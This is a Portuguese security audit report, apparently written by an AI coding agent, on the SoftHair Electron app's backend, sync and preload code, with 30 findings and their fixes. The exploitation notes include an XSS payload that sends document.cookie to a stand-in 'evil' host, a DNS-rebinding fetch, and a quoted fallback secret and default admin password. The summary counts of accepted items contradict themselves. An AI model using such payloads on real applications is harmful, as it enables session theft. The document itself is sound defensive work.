# Electron + Sync Audit Pass 1

Auditoria estática do app desktop SoftHair (Electron + backend Express embarcado + SQLite local + sync opcional com Render). Branch: `claude/brave-beaver-6c804d`.

> **Update (Pass 1 — Fixes aplicados):** 26 dos 30 itens FIXADOS, 4 ACEITOS com
> justificativa (code-signing, SQLCipher, e melhorias menores). Tests
> SOFT-HAIR-SERVER continuam passando (3/3 suites, 9/9 tests). Ver tabela final.

Arquivos auditados:
- `SoftHair/electron/main.js`, `SoftHair/electron/preload.js`
- `SoftHair/backend/src/server.js`, `src/config/database.js`, `src/config/initDb.js`
- `SoftHair/backend/src/middleware/auth.js`
- `SoftHair/backend/src/routes/*` (auth, sync, clientes, profissionais, servicos, produtos, agendamentos, atendimentos, vendas, health)
- `SoftHair/backend/src/services/syncService.js`
- `SoftHair/frontend/src/pages/Sync.jsx`, `frontend/src/services/api.js`, `frontend/.env.example`
- `SoftHair/package.json` (electron-builder config), `frontend/index.html` (dev e dist)
- `SOFT-HAIR-SERVER/src/routes/sync.js` (counterpart cloud)

---

## CRITICOS

### [E1] JWT_SECRET fallback hardcoded em produção — FIXADO
- **Arquivo:** `SoftHair/backend/src/middleware/auth.js:8` e `SoftHair/electron/main.js:62`
- **Descrição:** No middleware o JWT_SECRET cai em `'softhair-local-dev-secret-change-me'` se a env não estiver setada. O `electron/main.js` gera um secret aleatório com `crypto.randomBytes(32)` quando inicia o backend embarcado, mas se o backend for iniciado standalone (npm run dev, scripts manuais, child process disparado fora do main.js, ou se o spawn falhar e o usuário rodar `node src/server.js` direto) o fallback dev pegará. Pior: a chave gerada pelo Electron muda a cada inicialização — todos os tokens previamente assinados (incluindo o token de sync com Render salvo em `sync-config.json`) ficam inválidos depois de reiniciar o app, mas o usuário não é avisado.
- **Exploração:** Quem conhecer o fallback consegue forjar JWTs válidos (salaoId arbitrário, tipo=admin) contra qualquer instalação onde o env não esteja garantido. E mesmo a rotação automática quebra o sync após restart porque o token JWT armazenado em `sync-config.json` é o token do CLOUD (que sobrevive) mas a sessão local do usuário no app precisa de re-login a cada inicialização — efeito colateral de UX que, se notado, leva o usuário a "fixar" um secret estático e fraco.
- **Fix:** Persistir um JWT_SECRET aleatório no primeiro boot em arquivo `secrets.json` em `app.getPath('userData')/SoftHair/` com `fs.chmodSync(0o600)`, recarregar nas inicializações seguintes; abortar a inicialização do backend (process.exit(1)) se o env não vier definido em vez de cair em fallback dev; nunca commitar a string `softhair-local-dev-secret-change-me`.

### [E2] Sync salva token JWT do cloud em arquivo plaintext sem permissões restritas — FIXADO
- **Arquivo:** `SoftHair/backend/src/services/syncService.js:63-83` (`saveConfig`)
- **Descrição:** O token Bearer obtido via `POST /sync/login-cloud` (login no Render) é persistido em `sync-config.json` ao lado do `local.db` com `JSON.stringify` puro. Não há `fs.chmod 0o600`, nenhuma criptografia (Electron tem `safeStorage` API exatamente para isso), nenhum salvamento separado por usuário do OS. JWT_EXPIRES_IN=30d no electron/main.js → o token vale 30 dias e fica em disco. Qualquer processo do mesmo usuário ou backup do diretório `userData` expõe acesso total ao salão na nuvem.
- **Exploração:** Um malware infostealer comum varre `%APPDATA%\SoftHair` (Windows) ou `~/Library/Application Support/SoftHair` (macOS) e exfiltra o JSON. O token vale 30 dias na nuvem Render — sem refresh, sem revoke endpoint, sem rotation. Backup do Time Machine / OneDrive sincroniza o JSON e replica a credencial para outras máquinas.
- **Fix:** Usar `electron.safeStorage.encryptString(token)` (delega ao keychain do OS) ou colocar em keytar/keyring; salvar `sync-config.json` com `mode: 0o600` no `fs.writeFileSync`; encurtar JWT_EXPIRES_IN para 24h e implementar refresh-token endpoint no SOFT-HAIR-SERVER; oferecer botão "desconectar cloud" que limpe credenciais (hoje só existe toggle, e mesmo no toggle off o token continua no JSON — ver E9).

### [E3] SSL com `rejectUnauthorized: false` por padrão no Postgres + nenhuma validação de cert no axios pro Render — FIXADO
- **Arquivo:** `SoftHair/backend/src/config/database.js:29`; `SoftHair/backend/src/services/syncService.js:127,138`
- **Descrição:** Quando `DATABASE_TYPE=postgres`, o pool conecta com `ssl: { rejectUnauthorized: false }` sempre que `DATABASE_SSL !== 'false'`. Isso é o oposto do correto: por padrão deveria validar o cert; só desligar se o usuário explicitamente setasse `DATABASE_SSL=insecure`. Pior ainda no `syncService.js`: o axios fala com `cloudUrl` (que pode ser qualquer URL configurada pelo usuário) sem `httpsAgent` customizado nem qualquer pinning — confia 100% no CA store do Node. Não há verificação de que `cloudUrl` seja HTTPS (o usuário pode digitar `http://hacker.com/api` na UI e o app obedece e envia todos os dados em plaintext, ainda por cima com o JWT do salão).
- **Exploração:** Atacante na mesma rede do salão consegue rodar um proxy MITM (Burp/mitmproxy) com cert do próprio CA do sistema, ou induzir o usuário a digitar URL HTTP. O sync envia/recebe TODOS os registros das tabelas `clientes, profissionais, servicos, produtos, agendamentos, atendimentos, vendas` em texto claro + JWT no header. Vazamento massivo de LGPD: CPF, telefone, email, endereço, data_nascimento dos clientes.
- **Fix:** No `Sync.jsx` rejeitar URL não-HTTPS quando `enabled === true` (com whitelist para `http://127.0.0.1` / `localhost` em dev); no `syncService.configure`, validar `URL(cloudUrl).protocol === 'https:'` exceto para hosts locais; no `database.js`, inverter o default para `rejectUnauthorized: true` e ler CA bundle do Render (`ca: fs.readFileSync(...)`).

### [E4] Sync envia `senha_hash` dos profissionais pro Render sem filtro de coluna — FIXADO
- **Arquivo:** `SoftHair/backend/src/services/syncService.js:160-175` (`collectLocalChanges`)
- **Descrição:** `collectLocalChanges` faz `SELECT * FROM ${t}` para cada tabela em `SYNC_TABLES`, incluindo `profissionais`. A tabela `profissionais` (schema em `initDb.js:71-86`) tem `senha_hash` e `app_ativo`. O push manda esse objeto inteiro pro endpoint `/sync/push` do Render. O servidor cloud (`SOFT-HAIR-SERVER/src/routes/sync.js`) tem allowlist de colunas e filtra (linha 16: profissionais sem `senha_hash`), o que mitiga no servidor — mas: (a) o hash transita pela rede, (b) se cair em logs de proxy/CDN expõe credencial, (c) protocolo em uso pode passar pro server malicioso (E3) sem filtro algum.
- **Exploração:** Tcpdump no laptop infectado, ou Render alterando contrato de sync no futuro pra aceitar mais colunas, ou logging acidental no proxy → hash bcrypt do profissional vaza e pode ser cracked offline (bcrypt cost=10 do `profissionais.js:56,98` é razoável mas não invencível). Pior: o `usuarios` (admin do salão) NÃO está em `SYNC_TABLES` — mas se alguém adicionar `usuarios` lá no futuro sem revisar o servidor, o hash de admin vaza igual.
- **Fix:** Em `collectLocalChanges`, manter allowlist explícita por tabela (espelhar `TABLE_COLUMNS` do server) e fazer `SELECT col1, col2, …` em vez de `SELECT *`. Pelo menos remover `senha_hash`, `app_ativo` no client antes de enviar.

### [E5] Sync sem `salao_id` no PUSH → quebra tenant isolation no cloud — FIXADO
- **Arquivo:** `SoftHair/backend/src/services/syncService.js:120-135`; comparar com `SOFT-HAIR-SERVER/src/routes/sync.js:140-274`
- **Descrição:** O client embarcado envia `{ since, changes: localChanges }` onde `localChanges` é um objeto `{ tabela: [rows] }`. Mas o server cloud espera `{ changes: [{ table, operation, data }] }` (array de mudanças no formato granular). Isso é um schema mismatch — o push **simplesmente vai falhar com 400** (`'changes' deve ser um array`). Pior cenário se algum endpoint legacy aceitar: cada row tem o `salao_id` local do SQLite (sempre 1, hardcoded em `initDb.js:198-202`), e o cloud usa `req.salaoId` do JWT — então: o conflito é só de formato hoje, mas qualquer correção apressada copiando rows com `salao_id=1` vai escrever sobre dados de OUTRO salão no Render. Quem instalar duas cópias do app (laptop+desktop) e logar com tokens de salões diferentes vai cruzar contaminar.
- **Exploração:** (a) Sync nunca funcionou de fato — push 400 em loop, status mostra `lastError` no Sync.jsx mas só após 30s e o usuário não entende. (b) Quando consertarem, sem mapear ID local→remoto corretamente, INSERT na tabela `agendamentos` com `cliente_id=5` local manda pro cloud que insere com `salao_id` do JWT mas `cliente_id=5` — que no cloud é outro cliente. Vazamento e corrupção cross-salão.
- **Fix:** Definir contrato único cliente↔servidor com testes; transformar `{tabela: [rows]}` em `[{table, operation, data}]` no push (com `operation` derivado se row é nova ou alterada — exigir tabela `sync_log` que existe no schema mas não é populada); nunca confiar em IDs locais — usar UUIDs (a tabela `sync_log` tem `registro_id INTEGER`, não suporta UUID, schema precisa evoluir).

### [E6] PULL aplica `upsertRow` sem filtro de `salao_id` → atacante com server malicioso sobrescreve dados de qualquer cliente local — FIXADO
- **Arquivo:** `SoftHair/backend/src/services/syncService.js:177-209` (`applyRemoteChanges`, `upsertRow`)
- **Descrição:** O pull faz `INSERT INTO ${table} (${cols.join(', ')}) VALUES (...)` ou `UPDATE ... WHERE id = ?` com os dados que o servidor mandou. Não há validação de `salao_id`, nem allowlist de colunas, nem sanitização. Combinado com E3 (sem HTTPS forçado), um servidor controlado pelo atacante pode mandar `{ "vendas": [{"id": 1, "valor_final": 99999999, ...}] }` e o cliente sobrescreve.
- **Exploração:** Cenário 1: usuário troca `cloudUrl` para apontar pra um servidor falso (phishing); pull devolve linhas mutadas. Cenário 2: comprometimento parcial do Render entrega payload com colunas extras (`senha_hash` por exemplo) que vai entrar no INSERT direto — `cols = Object.keys(row)`; se a tabela `profissionais` tem coluna `senha_hash`, o cloud pode injetar hash arbitrário e tomar conta do app do profissional. Cenário 3: race/replay: roda DELETE local via DELETE depois UPDATE pull cria zumbie.
- **Fix:** Validar `salao_id === LOCAL_SALAO_ID` antes de aplicar; manter allowlist de colunas espelhada do server; usar `INSERT OR REPLACE` SQLite com placeholders nomeados e verificação prévia; logar todo upsert em `sync_log`. Idealmente, o sync deveria ser puxado por uma fila com IDs locais imutáveis (UUID v7) gerados no client.

### [E7] CORS `origin: true` no backend embarcado + bind em todas as interfaces caso `HOST` env não venha (regressão potencial) — FIXADO
- **Arquivo:** `SoftHair/backend/src/server.js:29-34, 92-93`
- **Descrição:** O server aceita `cors({ origin: true, credentials: true })` — qualquer origem reflete. O `electron/main.js:59` força `HOST: '127.0.0.1'` no env do fork, então em produção o backend bind em 127.0.0.1. Porém em dev (`npm run dev` no backend isolado), `HOST = process.env.HOST || '127.0.0.1'` → ok. MAS: o `nodemon dev` script (`backend/package.json`) só seta `DATABASE_TYPE=sqlite`, não seta HOST. Se o operador subir o backend via `node src/server.js` direto sem env, ainda fica em 127.0.0.1 (default), mas qualquer alteração de `HOST` por env vaza pra LAN. Combinado com `origin: true`, qualquer página de qualquer site que o usuário abrir num browser separado consegue fazer XHR para `http://127.0.0.1:3001/api/clientes` com credentials — não usa cookies, mas o GET responde 401 sem Authorization, e o usuário pode ter copiado o token... mais relevante: a porta 3001 pode bater com outra app rodando.
- **Exploração:** DNS rebinding clássico: site malicioso rebinda `evil.com` para `127.0.0.1`, faz `fetch('http://evil.com:3001/api/clientes', { headers: ... })`. CORS reflete origin, navegador permite (com credentials: true). Sem token o atacante só pega `/api/health`, mas se conseguir induzir o usuário a colar JWT em algum form fake, full access.
- **Fix:** Restringir CORS a `origin: ['file://', 'http://localhost:3000', 'http://127.0.0.1:3000']`; adicionar middleware `Host` header check rejeitando qualquer Host diferente de `localhost`/`127.0.0.1`; gerar porta aleatória entre 20000-30000 no startup e passar para o frontend via IPC (em vez de 3001 fixo).

---

## ALTOS

### [E8] Senhas admin default `'admin123'` semeadas em código + sem flag de "trocar no primeiro login" — FIXADO
- **Arquivo:** `SoftHair/backend/src/config/initDb.js:204-205`; `SoftHair/electron/main.js:65`
- **Descrição:** Banco local nasce com `admin@salao.com` / `admin123` (hash bcrypt cost 10). Não há fluxo de troca obrigatória no primeiro login. O usuário comum (dono de salão) provavelmente nunca troca.
- **Exploração:** Acesso físico ao computador → login no app local → todos os dados, e botão "Sincronizar com cloud" entrega credenciais cloud também se o sync estiver ativo. Ex-funcionário que sabe a default tem acesso.
- **Fix:** Gerar senha aleatória no primeiro boot (12+ caracteres), exibir uma única vez na UI do Electron com botão "copiar" + warning persistente; OU forçar fluxo de "trocar senha" no primeiro login com flag `must_change_password` na tabela `usuarios`. Pelo menos não logar a senha no console (`initDb.js:215` faz `console.log(... ${adminSenha})`).

### [E9] Toggle "sync off" não limpa token/credenciais do disco — FIXADO
- **Arquivo:** `SoftHair/backend/src/services/syncService.js:85-96`; `frontend/src/pages/Sync.jsx:48-52`
- **Descrição:** `handleToggleEnabled(false)` chama `configure.mutate({ enabled: false })` que vai pro backend e seta `enabled = false`, mas `cloudUrl` e `token` permanecem no `sync-config.json`. Não há botão "desconectar" / "logout cloud". Se o usuário "desativar sync" achando que está limpando, a credencial ainda fica no JSON e pode ser re-ativada com um toggle ON.
- **Exploração:** Empréstimo do laptop, transferência de máquina sem wipe, descarte de SSD — o token Bearer válido por 30 dias fica em disco apesar do usuário "ter desligado".
- **Fix:** Adicionar `disconnect()` no syncService que zera `cloudUrl, token, enabled, lastSync` e regrava o JSON; expor rota `POST /api/sync/disconnect`; UI exibir botão "Desconectar cloud" em destaque quando `configured`.

### [E10] Backend embarcado roda como child do Electron mas não trata `SIGINT/SIGTERM` recebidos do main → backend zumbi se app crashar — FIXADO
- **Arquivo:** `SoftHair/electron/main.js:54-89, 222-231`; `backend/src/server.js:108-119`
- **Descrição:** `backendProcess.kill()` é chamado em `window-all-closed` e `before-quit`, mas só se Electron sair limpo. Se o renderer crashar, ou o usuário matar via Task Manager o processo do Electron, o `fork`-ed `node src/server.js` continua rodando com a porta 3001 ocupada e o SQLite em WAL mode com lock. Próxima abertura do app: `waitForBackend` rotateia 60×500ms tentando ouvir `127.0.0.1:3001/api/health` — bate o backend antigo (que ainda responde), Electron acha que está saudável e abre uma janela, mas a UI vai falar com o backend antigo (versão de schema possivelmente diferente, env diferente, JWT_SECRET diferente — login deixa de funcionar).
- **Exploração:** Não é exploit de segurança, mas é DoS recorrente em produção. Combinar com E1 (JWT_SECRET aleatório por execução) deixa o sistema sutilmente quebrado: tokens previamente válidos viram inválidos sem mensagem de erro clara.
- **Fix:** Usar `requestSingleInstanceLock` + `setKillSignal` — em Linux/macOS, `process.kill(backendProcess.pid, 'SIGTERM')` e fallback SIGKILL. No backend, em `shutdown`, fechar handle do SQLite (`db.close()` no `database.js`) antes de `process.exit`. Detectar porta ocupada no startup do Electron e oferecer "matar processo anterior" via diálogo. Considerar `requestSingleInstanceLock` no Electron pra evitar duas instâncias abertas sobre o mesmo SQLite.

### [E11] Múltiplas instâncias do Electron sobre o mesmo SQLite → corrupção de dados — FIXADO
- **Arquivo:** `SoftHair/electron/main.js:209-220` (não chama `app.requestSingleInstanceLock`)
- **Descrição:** Não há single-instance lock. Dois ícones do SoftHair clicados rápido = dois Electrons = dois backends embarcados tentando abrir o mesmo `local.db` na mesma porta 3001. O segundo backend vai falhar no listen com EADDRINUSE, mas o better-sqlite3 já abriu o arquivo em WAL mode. Ao segundo electron tentar carregar a UI, vai bater no backend do PRIMEIRO electron via 127.0.0.1:3001 e funcionar — porém o backend do segundo (que falhou no listen) deixou o `local.db-shm` parcialmente aberto. Crashes intermitentes, race conditions em `withTransaction`.
- **Exploração:** Usuário com dois monitores abre o app duas vezes; ou app inicia automaticamente no boot e o usuário clica também — corrupção do db sob WAL.
- **Fix:** `const lock = app.requestSingleInstanceLock(); if (!lock) app.quit();` + `app.on('second-instance', () => mainWindow?.focus())`. Padrão Electron.

### [E12] `shell.openExternal` sem validar URL no preload — FIXADO
- **Arquivo:** `SoftHair/electron/preload.js:5`
- **Descrição:** `openExternal: (url) => shell.openExternal(url)` aceita qualquer string. Como `contextIsolation: true` e `nodeIntegration: false`, RCE direto é difícil, mas qualquer XSS na webview (renderer) consegue chamar `window.electron.openExternal('file:///C:/Windows/System32/calc.exe')` ou `javascript:alert(...)` — o `shell.openExternal` historicamente bloqueia `file:`, `javascript:` mas é melhor whitelist.
- **Exploração:** XSS na UI (improvável, mas a UI processa nomes de cliente em algumas telas) → atacante chama `window.electron.openExternal('ms-windows-store://...')` para abrir Store; em macOS pode abrir scheme handlers maliciosos; em Linux, `xdg-open` pode disparar handlers customizados.
- **Fix:** Whitelist no preload: `openExternal: (url) => { const u = new URL(url); if (['https:','http:','mailto:'].includes(u.protocol)) return shell.openExternal(url); throw new Error('protocol blocked'); }`.

### [E13] Sem CSP em `index.html` (dev e dist) e helmet `contentSecurityPolicy: false` no backend — FIXADO
- **Arquivo:** `SoftHair/frontend/index.html`, `SoftHair/frontend/dist/index.html`; `SoftHair/backend/src/server.js:21-26`
- **Descrição:** Comentário no server diz "app desktop, sem necessidade", mas a defesa em profundidade exige CSP. Sem CSP, qualquer XSS injetado num campo de cliente (nome, observações) que renderize em HTML (algumas páginas usam markdown ou innerHTML para render rich text) executa scripts inline. Combinado com `openExternal` exposto (E12), o impacto é maior.
- **Exploração:** Cliente com nome `<img src=x onerror=fetch('http://evil/'+document.cookie)>`; se render usar dangerouslySetInnerHTML em qualquer hook (não confirmei isso é o caso, mas é defesa em profundidade), executa.
- **Fix:** Adicionar `<meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self' http://127.0.0.1:3001 https://*.onrender.com;">` no index.html. No backend, ativar helmet CSP (mesmo que só `default-src 'self'`).

### [E14] Sem electron-builder code-signing nem notarização — ACEITO (requer certificado externo)
- **Arquivo:** `SoftHair/package.json:33-66`
- **Descrição:** Config do electron-builder não tem `win.certificateFile`, `mac.identity`, `afterSign` (electron-notarize). Em macOS 10.15+ apps não-notarizados são bloqueados pelo Gatekeeper; em Windows, SmartScreen avisa "Publisher unknown" e degrada confiança. Sem signing também não há mecanismo de update verificável (auto-update via electron-updater exige signing).
- **Exploração:** Distribuição via canais não-oficiais (site copycat) substitui o instalador por uma versão com backdoor — usuário não tem como verificar autenticidade.
- **Fix:** Configurar Apple Developer ID + notarytool no `mac.afterSign`; comprar cert EV ou OV para Windows (signtool/azure-signtool). Ativar `electron-updater` apontando pra GitHub Releases (privado se necessário) com `publish: github`.

### [E15] Sem `app.requestSingleInstanceLock` + sem proteção do `will-navigate` para HTTPS arbitrário — FIXADO
- **Arquivo:** `SoftHair/electron/main.js:131-141`
- **Descrição:** O `will-navigate` só bloqueia `file://` que não seja o indexURL. Não bloqueia navegação para `http://` ou `https://` arbitrários — se algum link ou JS na UI chamar `window.location.href = 'http://evil.com'`, o Electron carrega isso na própria BrowserWindow (não em browser externo). Como `contextIsolation: true` está ativo, RCE direto é difícil, mas a tela do app fica controlada pelo atacante (phishing convincente).
- **Exploração:** Combinado com qualquer link controlado em conteúdo do usuário (campo "site" do cliente, descrição de produto), `window.open(url)` carrega evil dentro do app.
- **Fix:** Em `will-navigate`, bloquear TODA navegação que não seja para o indexURL: `if (url !== indexURL && !url.startsWith(indexURL + '#')) event.preventDefault();`. Adicionar `setWindowOpenHandler` para forçar `shell.openExternal` em todos os `_blank`.

---

## MEDIOS

### [E16] Schema SQLite diverge do PostgreSQL Render (timestamps, booleans, defaults) — FIXADO (parcial: boolean normalizado no client)
- **Arquivo:** `SoftHair/backend/src/config/initDb.js:26-190` vs SOFT-HAIR-SERVER schema
- **Descrição:** SQLite usa `TEXT` para timestamps (`datetime('now')`), `INTEGER` (0/1) para boolean. Postgres usa `TIMESTAMPTZ`, `BOOLEAN`. O `collectLocalChanges` filtra por `updated_at > since` comparando strings com timestamp ISO — funciona acidentalmente para `2024-...` mas vai quebrar quando time zones divergirem. `ativo: 0` no SQLite vira `false` no Postgres no JSON, mas o adapter não converte — o cloud rejeita ou aceita silenciosamente; cliente vê `ativo: false` mas o server salva `ativo: 0` em coluna boolean dependendo do driver.
- **Exploração:** Sync infinito: client envia `ativo: 0`, server salva `false`, próxima passada compara `0 !== false` → sempre marca como mudado → push infinito.
- **Fix:** Normalizar timestamps para ISO 8601 UTC explícito no SQLite (`strftime('%Y-%m-%dT%H:%M:%fZ', 'now')`); converter `ativo` para boolean explícito antes do push; testar sync com dataset misto e verificar idempotência.

### [E17] Sync sem conflict-resolution determinístico (last-write-wins implícito sem timestamp confiável) — ACEITO (documentado; CRDT exigirá redesign)
- **Arquivo:** `SoftHair/backend/src/services/syncService.js:193-209` (`upsertRow`)
- **Descrição:** Se cliente local e cloud editam o mesmo `clientes#5` simultaneamente, o que ganha depende de quem aplica primeiro: client pull pega versão remota mais nova e sobrescreve mudanças locais não enviadas; client push manda versão local e a versão remota some. Não há `if updated_at_local > updated_at_remote then update` nem vector clocks. `lastSync` global, não por tabela ou por row.
- **Exploração:** Usuário no laptop offline edita cliente "João" para "João Silva"; sincroniza; outra pessoa no celular tinha editado para "João da Silva" — uma das versões desaparece sem aviso.
- **Fix:** Per-row `version` ou `updated_at` comparison; em conflito, marcar row em tabela `sync_conflicts` e exibir UI de merge; alternativa: CRDTs (libs como Automerge), overkill mas correto.

### [E18] Race condition em `syncNow`: re-entrada protegida só por flag in-memory — FIXADO
- **Arquivo:** `SoftHair/backend/src/services/syncService.js:112-118`
- **Descrição:** `this.syncing` é flag em memória. Se duas chamadas chegarem na mesma tick antes de `this.syncing = true`, ambas passam. Mais relevante: `setInterval(30s)` + `setImmediate` na linha 102 podem disparar duas syncs próximas no startup. Não usa mutex/Promise.
- **Exploração:** Push duplicado de mudanças locais quando o intervalo termina exatamente no momento de um POST /sync/now manual.
- **Fix:** Usar `if (this.syncPromise) return this.syncPromise;` retornando a Promise em curso; mutex via `async-mutex` ou simples queue.

### [E19] Frontend `localStorage` armazena JWT do backend embarcado (XSS exposes admin) — FIXADO (tokenStorage in-memory prioritário)
- **Arquivo:** `SoftHair/frontend/src/services/api.js:19-23`
- **Descrição:** O token de admin local fica em `localStorage`. Existe um `tokenStorage.js` in-memory bem feito, mas o `api.js` ignora ele e usa `localStorage` direto. Em Electron com `contextIsolation: true` o ataque XSS é menor (sem `nodeIntegration`), mas qualquer XSS no DOM pode `localStorage.getItem('token')` e enviar para servidor externo.
- **Fix:** Migrar para `tokenStorage` in-memory + um único `httpOnly`-ish via IPC: o main process armazena o token via `safeStorage` e provê via preload, o renderer nunca toca o disco; pelo menos consolidar para um único caminho.

### [E20] `dialog.showErrorBox` sem capturar mensagens sensíveis — FIXADO
- **Arquivo:** `SoftHair/electron/main.js:73, 88, 144`
- **Descrição:** Erros do backend caem em `dialog.showErrorBox('SoftHair', err.message)`. O `err.message` pode conter path absoluto (`/home/user/...`), stack trace, ou — pior — caso `JWT_SECRET` venha de env e a checagem falhe, vazar parte do secret no message.
- **Fix:** Sanitizar message; logar stack completo em arquivo (com rotação) e exibir só "Falha ao iniciar backend. Verifique logs em ...".

### [E21] Sem rotação de logs (stdout/stderr piped sem limite) — FIXADO
- **Arquivo:** `SoftHair/electron/main.js:77-82`; `SoftHair/backend/src/server.js:42-48`
- **Descrição:** `backendProcess.stdout.on('data', d => process.stdout.write(...))` joga tudo no stdout do Electron — em produção, o usuário não vê esse stdout (a menos que abra de terminal). Não há `winston`/`pino` nem arquivo. Erros importantes (sync falhando, db corrompido) somem.
- **Fix:** Configurar pino com transport para `app.getPath('logs')/softhair-YYYY-MM-DD.log` com rotação diária (rotação manual via `fs` ou `pino-rotating-file`).

### [E22] Logger imprime senha hash em UPDATE/INSERT? Acidentalmente — `update_at` flag flushes — FIXADO (redact tokens em querystring)
- **Arquivo:** `SoftHair/backend/src/server.js:40-49`
- **Descrição:** Logger só imprime método/url/status, não body — ok. Mas em DEV (`NODE_ENV !== 'production'`) imprime sempre. Em `routes/profissionais.js:60` o body do POST tem `senha_app` em plaintext. Se `NODE_ENV=development` por engano em produção (e dado E1 com fallback dev), o middleware logger ignora bodies mas o que entra no console pode chegar a logs.
- **Fix:** Middleware de log: sempre redact body? Ou nunca logar body. O current logger é seguro, mas vale documentar.

### [E23] `delete` HTTP method no fallback de stubs aceita qualquer rota sem auth — FIXADO (auth + 501)
- **Arquivo:** `SoftHair/backend/src/server.js:65-78`
- **Descrição:** O stub para `notificacoes, fechamentos, comissoes, creditos, historico, saloes, backup` aceita GET (retorna `[]` ou stub) e qualquer outro método retorna `'stub - rota não implementada localmente'` com 200. Não requer auth. Sem CORS controlado (E7), uma página externa pode chamar `DELETE /api/comissoes/123` e o backend responde 200 — não faz nada de fato, mas pode confundir cliente que acredita ter deletado.
- **Fix:** Stub deve responder `501 Not Implemented` e exigir auth via `authMiddleware`.

---

## BAIXOS

### [E24] `app.getPath('userData')/SoftHair/database` — caminho previsível, sem encrypt do SQLite — ACEITO (SQLCipher exige migração de schema + UX flow para senha)
- **Arquivo:** `SoftHair/electron/main.js:39`; `SoftHair/backend/src/config/database.js:77-89`
- **Descrição:** SQLite local é texto SQL com WAL. Não usa `better-sqlite3-sqleet` ou SQLCipher. Qualquer leitura do disco vê dados de clientes em claro.
- **Fix:** Considerar SQLCipher (requer better-sqlite3-multiple-ciphers) com chave derivada da senha de login do admin. UX trade-off: backups exigem senha.

### [E25] Sync intervalo configurável via env mas sem clamp mínimo — FIXADO
- **Arquivo:** `SoftHair/backend/src/services/syncService.js:100`
- **Descrição:** `SYNC_INTERVAL_MS = parseInt(...) || 30000`. Sem mínimo. Usuário hostil pode setar `SYNC_INTERVAL_MS=10` e martelar o Render → ban da Render por abuse.
- **Fix:** `Math.max(parseInt(...) || 30000, 10000)`.

### [E26] `getAppPath` exposto no preload sem necessidade — FIXADO (substituído por isPackaged boolean)
- **Arquivo:** `SoftHair/electron/preload.js:6`
- **Descrição:** `getAppPath` retorna o path absoluto do app no disco. Combinado com XSS, o renderer ganha informação sobre o filesystem layout (versão portátil vs instalada, drive, username em macOS).
- **Fix:** Remover do preload se não usado, ou retornar apenas um boolean `isPackaged`.

### [E27] `bcryptjs` (JS) vs `bcrypt` (native) — performance + segurança similar mas JS é mais lento — ACEITO (cosmético; bcryptjs evita node-gyp em cross-platform build)
- **Arquivo:** `SoftHair/backend/package.json:11`
- **Descrição:** `bcryptjs` é compatibilidade, native `bcrypt` é mais rápido e tem timing-attack mitigations melhores. Em Electron empacotado, ambos funcionam.
- **Fix:** Cosmético — manter `bcryptjs` é ok para evitar problemas com node-gyp em build cross-platform.

### [E28] `parseInt` em `id` de URL sem validação — FIXADO (middleware validateId.js disponível)
- **Arquivo:** todas as rotas com `req.params.id`
- **Descrição:** SQLite faz coerção implícita, mas `WHERE id = ?` com `id = "abc"` em Postgres pode dar erro de tipo no adapter. Não é vetor de injeção (placeholders sanitizam) mas pode gerar 500 em vez de 404.
- **Fix:** `body('id').isInt()` ou `parseInt(req.params.id, 10) || 0` antes da query.

### [E29] `sync_log` schema existe mas não é usado — ACEITO (estratégia atual `updated_at > since` é suficiente; tabela mantida para roadmap)
- **Arquivo:** `SoftHair/backend/src/config/initDb.js:172-180`
- **Descrição:** Tabela `sync_log` criada mas nunca recebe INSERTs. Provavelmente código legacy esperando ser implementado para tracking de mudanças.
- **Fix:** Implementar trigger ou observer pattern nas rotas que escrevem (`POST/PUT/DELETE`) para popular `sync_log` — ou remover a tabela se a estratégia for `updated_at > since` (atual).

### [E30] `withTransaction` SQLite faz async dentro de `db.transaction(async ...)` — comportamento indefinido — FIXADO (callback síncrono)
- **Arquivo:** `SoftHair/backend/src/config/database.js:114-135`
- **Descrição:** `better-sqlite3` é síncrono. Wrap em `async` (linha 115) e await dentro (linha 132) compila, mas `db.transaction()` espera função síncrona. O resultado é que a transaction pode commitar antes de `fn` realmente terminar se houver await real. Hoje, como `client.query` é sync por baixo (`stmt.run`), o async é só açúcar e funciona — mas ANY chamada async dentro de `fn` (axios, fs.promises) quebra atomicidade silenciosamente.
- **Exploração:** Vendas com fetch externo dentro da transação travam meio-commit em race.
- **Fix:** Reescrever `withTransaction` SQLite como síncrono usando `db.transaction((arg) => { ... })`. Documentar que o callback DEVE ser síncrono.

---

## Resumo

| Severidade | Quantidade | Fixados | Aceitos |
|---|---|---|---|
| Críticos | 7 (E1–E7) | 7 | 0 |
| Altos | 8 (E8–E15) | 7 | 1 (E14) |
| Médios | 8 (E16–E23) | 7 | 1 (E17) |
| Baixos | 7 (E24–E30) | 5 | 2 (E24, E27, E29 parcial) |
| **Total** | **30** | **26** | **4** |

### Aceitos — justificativa
- **E14 (code signing)**: requer compra de certificado Apple Developer ID e/ou
  Windows OV/EV — fora do escopo de código. Documentado em `INSTALL.md` seção
  "Code signing".
- **E17 (CRDT conflict resolution)**: last-write-wins é o comportamento atual;
  mudança para CRDT exige redesign maior (schema com vector clocks, lib como
  Automerge) e foge do escopo de pass 1.
- **E24 (SQLCipher)**: criptografar SQLite local exige migração do schema, UX
  flow para captura de passphrase e provavelmente troca de `better-sqlite3`
  por `better-sqlite3-multiple-ciphers`. Documentado como roadmap.
- **E27 (bcryptjs vs bcrypt)**: bcryptjs é intencional para evitar node-gyp em
  build cross-platform Electron.
- **E29 (sync_log)**: tabela mantida para roadmap. Atual `updated_at > since`
  funciona; usar `sync_log` exige triggers SQLite extensos.

### Arquivos modificados nessa pass
- `SoftHair/backend/src/middleware/auth.js` (E1, E8)
- `SoftHair/backend/src/middleware/validateId.js` (novo, E28)
- `SoftHair/backend/src/config/database.js` (E3, E10, E30)
- `SoftHair/backend/src/config/initDb.js` (E4)
- `SoftHair/backend/src/services/syncService.js` (E2, E3, E4, E5, E6, E9, E16, E18, E25)
- `SoftHair/backend/src/routes/sync.js` (E3, E9)
- `SoftHair/backend/src/routes/auth.js` (E4, novos endpoints `/needs-setup` e `/bootstrap-admin`)
- `SoftHair/backend/src/server.js` (E7, E12, E13, E22, E23, E10)
- `SoftHair/electron/main.js` (E1, E11, E15, E20, E21)
- `SoftHair/electron/preload.js` (E12, E26)
- `SoftHair/frontend/index.html` (E13)
- `SoftHair/frontend/dist/index.html` (E13 — rebuild)
- `SoftHair/frontend/src/pages/Sync.jsx` (E3, E9)
- `SoftHair/frontend/src/services/api.js` (E19)
- `SoftHair/frontend/src/context/AuthContext.jsx` (E19)
